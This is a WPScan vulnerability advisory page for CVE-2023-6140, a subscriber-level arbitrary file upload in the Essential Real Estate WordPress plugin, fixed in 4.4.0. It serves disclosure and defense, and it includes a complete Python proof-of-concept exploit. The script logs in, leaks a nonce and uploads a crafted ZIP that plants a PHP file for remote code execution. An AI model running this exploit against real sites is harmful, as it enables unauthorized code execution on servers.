=== Content from wpscan.com_673e59c1_20250110_134552.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Essential Real Estate < 4.4.0 - Subscriber+ Arbitrary File Upload

### Description

The plugin does not prevent users with limited privileges on the site, like subscribers, from momentarily uploading malicious PHP files disguised as ZIP archives, which may lead to remote code execution.

### Proof of Concept

from io import BytesIO
import requests
import zipfile
import sys
import re
if len(sys.argv) != 4:
print('USAGE: python %s <target\_url> <user\_login> <user\_pass>' % (sys.argv[0],))
sys.exit()
url = sys.argv[1].rstrip('/')
with requests.Session() as s:
'''
This exploit requires an account on the site (subscriber+)
'''
print('Logging in..')
# Log into WordPress using our Subscriber account
res = s.post(
url + '/wp-login.php',
headers={ 'Cookie': 'wordpress\_test\_cookie=WP Cookie check' },
data={'log':sys.argv[2], 'pwd':sys.argv[3], 'wp-submit': 'Log In', 'redirect\_to': '/wp-admin/', 'testcookie':1})
print('Leaking nonce..')
# Leak nonce
nonce = re.search(r'GSF\_META\_DATA.\*"nonce":"([0-9a-f]+)"', s.get(url + '/wp-admin/profile.php?action=delete').text)
if not nonce:
print('Couldn\'t find nonce!')
sys.exit()
nonce = nonce.group(1)
print('Creating malicious ZIP file..')
# Create a zip file in memory
zip\_buffer = BytesIO()
with zipfile.ZipFile(zip\_buffer, 'w', zipfile.ZIP\_DEFLATED) as zip\_file:
# Malicious file whose name will launch phpinfo() later
zip\_file.writestr('<?php phpinfo();die();\_\_halt\_compiler();?>', '')
# Add an empty style.css file
zip\_file.writestr('style.css', '')
# A lot of useless file to give the user time to access the uploaded shell
for i in range(1000000):
zip\_file.writestr(f'{i}.woff', 'A')
# Seek back to the beginning of the buffer
zip\_buffer.seek(0)
print(f'Sending malicious font: Time to access {url}/wp-content/uploads/gsf-fonts/phpinfo.php in your browser!')
# Send malicious request uploading our shell
print(s.post(
url + '/wp-admin/admin-ajax.php?action=gsf\_upload\_fonts',
data={'\_nonce': nonce, 'name': 'malicious\_font2'},
files={'file\_font': ('phpinfo.php', zip\_buffer, 'application/zip')}).text)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

essential-real-estate](https://a8cteam5105.wordpress.com/plugin/essential-real-estate/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.4.0

### References

CVE
[CVE-2023-6140](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6140)

### Miscellaneous

Original Researcher
Marc Montpas, Krzysztof Zając (CERT PL)

Submitter
Marc Montpas

Submitter website
<https://wpscan.com>

Submitter twitter
[marcS0H](//twitter.com/marcS0H)

Verified
Yes

WPVDB ID
[c837eaf3-fafd-45a2-8f5e-03afb28a765b](https://a8cteam5105.wordpress.com/vulnerability/c837eaf3-fafd-45a2-8f5e-03afb28a765b/)

### Timeline

Publicly Published
2023-12-18 (about 1 years ago)

Added
2023-12-18 (about 1 years ago)

Last Updated
2023-12-18 (about 1 years ago)

### Other

Published
Title

Published
2019-04-11
Title
[Ninja Forms File Uploads Extension <= 3.0.22 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/e5898e0e-db43-4641-b2cd-f6a72cdb8993/)

Published
2024-10-14
Title
[Feed Comments Number <= 0.2.1 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/799561d9-4377-430f-a108-661329a18a2a/)

Published
2016-12-10
Title
[Delete All Comments 2.0 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/4fd70c87-f432-4d27-ad5d-ef0401f412a8/)

Published
2023-12-27
Title
[WP Mail Log Plugin < 1.1.3 - Contributor+ Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/b5153b7c-7e14-4ac7-8ef9-c44c17aefe63/)

Published
2024-02-23
Title
[Brizy – Page Builder < 2.4.41 - Authenticated (Contributor+) Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/cf51d228-b175-4e8b-a7c2-8e4cb87e15bb/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + [Edit Site](https://a8cteam5105.wordpress.com/wp-admin/site-editor.php?postType=wp_template&postId=a8c/wpscan//index)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

